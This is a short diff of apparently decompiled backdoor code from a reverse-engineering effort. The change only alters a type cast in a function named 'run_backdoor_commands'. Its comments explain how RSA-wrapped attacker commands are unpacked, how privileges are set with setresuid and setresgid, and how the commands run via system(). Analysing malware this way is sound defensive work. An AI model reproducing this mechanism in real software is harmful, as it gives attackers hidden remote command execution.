@@ -171,7 +171,7 @@ BOOL run_backdoor_commands(RSA *key,global_context_t *ctx,BOOL *do_orig)
                   encrypted_payload_bytes[2] = (byte)((uint)rsa_modulus_bytes >> 0x10);
                   encrypted_payload_bytes[3] = (byte)((uint)rsa_modulus_bytes >> 0x18);
                   stack0xfffffffffffffd24 =
-                       CONCAT31(stack0xfffffffffffffd25,(undefined1)sigcheck_result);
+                       CONCAT31(stack0xfffffffffffffd25,(u8)sigcheck_result);
                   // AutoDoc: Strip the 0x87-byte RSA header (nonce, digest, signature framing) and treat the remainder of the modulus as attacker-controlled command bytes.
                   payload_body_len = rsa_payload_bytes - 0x87;
                   // AutoDoc: Opcode 2 treats the payload body as a `[uid||gid||cmd]` triple: it optionally loads the uid/gid pair, invokes setresgid/setresuid, and finally runs the attacker command through libc system().
